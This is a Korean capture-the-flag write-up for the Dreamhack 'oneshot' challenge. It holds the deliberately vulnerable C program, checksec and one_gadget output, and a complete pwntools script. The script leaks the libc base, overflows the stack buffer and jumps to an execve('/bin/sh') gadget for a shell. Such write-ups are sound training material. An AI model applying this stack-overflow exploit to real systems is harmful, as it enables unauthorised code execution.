## oneshot
---

```c
// gcc -o oneshot1 oneshot1.c -fno-stack-protector -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int main(int argc, char *argv[]) {
    char msg[16];
    size_t check = 0;

    initialize();

    printf("stdout: %p\n", stdout);

    printf("MSG: ");
    read(0, msg, 46);

    if(check > 0) {
        exit(0);
    }

    printf("MSG: %s\n", msg);
    memset(msg, 0, sizeof(msg));
    return 0;
}
```

<br><br>

## Solution
---

```
Ubuntu 16.04
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
```

<br>

```shell
index@KJS:~/oneshot$ one_gadget ./libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

<br>

check가 0이여야 하므로 이 조건을 생각해서 버퍼 오버플로우를 해보면, 입력을 rbp-0x20부터 받고 check는 rbp-0x8에 있다.

read는 46만큼받으므로 memset을 진행해도 리턴주소에는 가젯이 들어가있어서 셸을 실행할 것이다.

페이로드는 그럼 ```'A'*(0x20-0x8)+p64(0)+b'B'*0x8+p64(one_gadget)```이 된다.

one_gadget은 조건에 맞는 것을 골라야 한다.

첫 번째 가젯과 마지막 가젯은 확인해보니 각각 값이 0인 것을 확인할 수 있었는데, 3번째 가젯은 조건을 만족하는 것처럼 보였는데 왜 안되는지 의문이다..

<br>

```python
from pwn import *

p = remote('host1.dreamhack.games',15100)
libc = ELF('./libc.so.6')

p.recvuntil(b'stdout: ')

stdout = int(p.recvn(14),16)
libc_base = stdout - libc.symbols['_IO_2_1_stdout_']

print("@ stdout : ",hex(stdout))
print("@ libc_base: ", hex(libc_base))

one_gadget = libc_base + 0x45216
payload = b'A'*(0x20-0x8)+ p64(0) + b'B'*0x8 + p64(one_gadget)
p.sendlineafter(b'MSG: ', payload)

p.interactive()
```
